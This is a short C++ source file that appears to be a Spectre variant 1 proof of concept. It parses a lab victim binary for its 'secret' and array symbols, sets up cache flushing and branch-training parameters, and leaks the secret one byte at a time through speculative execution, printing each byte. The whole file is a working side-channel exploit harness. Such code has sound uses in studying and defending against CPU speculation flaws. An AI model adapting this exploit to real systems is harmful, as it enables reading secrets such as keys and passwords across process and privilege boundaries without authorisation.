//
// Created by sage on 1/17/21.
//
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
#include <lilelf.h>

int main()
{

    auto victim = LilElf("./Spec1Victim");

    // Look for symbols in victim
    auto sym_secret = victim.get_sym("secret");
    auto sym_array1_size = victim.get_sym("array1_size");
    auto sym_array2 =victim.get_sym("array2");
    auto sym_array1 = victim.get_sym("array1");

    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
    uint8_t* m_secret = victim.get_static_sym_value<uint8_t>(sym_secret);

    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
                victim.get_sym_value<void*>(sym_array2),
                [&](volatile size_t x){flush(m_array1_size);  ;;},
                [](size_t _t){return _t%16;},
                512,
                MAX_TRIES,
                31
    );
    uint8_t val;
    for (size_t i = 0; i < sym_secret->st_size; ++i)
    {
        s.read_byte(&m_secret[i], &val);
        printf("0x%02X = %c\n", val, val);
//        printf("0x%02x\n", m_secret[i]);
    }

}
